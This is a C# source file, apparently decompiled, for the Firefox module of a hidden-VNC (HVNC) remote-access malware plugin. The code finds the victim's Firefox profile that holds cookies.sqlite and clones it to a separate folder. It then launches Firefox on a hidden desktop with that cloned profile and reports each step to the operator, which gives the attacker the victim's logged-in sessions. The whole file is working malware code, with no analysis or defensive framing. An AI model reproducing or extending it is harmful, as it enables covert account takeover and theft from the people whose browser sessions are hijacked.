#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp;

internal class FireFox
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\Profiles";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\FireFox Data";

	private static readonly string FilenameFireFox = WDir.SystemDirectory + "Program Files\\Mozilla Firefox\\firefox.exe";

	private static readonly string FilenameFireFoxX86 = WDir.SystemDirectory + "Program Files (x86)\\Mozilla Firefox\\firefox.exe";

	public static void OpenFireFoxBrowser()
	{
		HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameFireFox) && !File.Exists(FilenameFireFoxX86))
			{
				HVNC.Plugin.Helper.SendMSG("Firefox: Not Installed!");
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					try
					{
						string text = string.Empty;
						string[] directories = Directory.GetDirectories(fileNameUserData);
						foreach (string text2 in directories)
						{
							string path = text2 + "\\cookies.sqlite";
							if (File.Exists(path))
							{
								text = Path.GetFileName(text2);
								break;
							}
						}
						HVNC.Plugin.Helper.SendMSG("Firefox: CloneProfile...");
						PC.FileSystem.CopyDirectory(fileNameUserData + "\\" + text, fileNameUserDataCopy);
						HVNC.Plugin.Helper.SendMSG("Firefox: CloneProfile Completed");
					}
					catch (Exception ex)
					{
						HVNC.Plugin.Helper.SendMSG("Firefox: " + ex.Message);
					}
				}
			}
			catch
			{
				Debug.WriteLine("Error!");
			}
			Debug.WriteLine("Complete.///");
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex2)
		{
			HVNC.Plugin.Helper.SendMSG("Firefox: " + ex2.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameFireFox))
			{
				text = FilenameFireFox;
			}
			if (File.Exists(FilenameFireFoxX86))
			{
				text = FilenameFireFoxX86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" -no-remote -profile \"" + fileNameUserDataCopy + "\"", HVNC.Plugin.Helper.NameDesktop, bAppName: false);
				Debug.WriteLine("Running.////");
				HVNC.Plugin.Helper.SendMSG("Firefox: Running");
				Thread.Sleep(3000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Debug.WriteLine("Refresh");
			}
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Firefox: " + ex.Message);
		}
	}
}
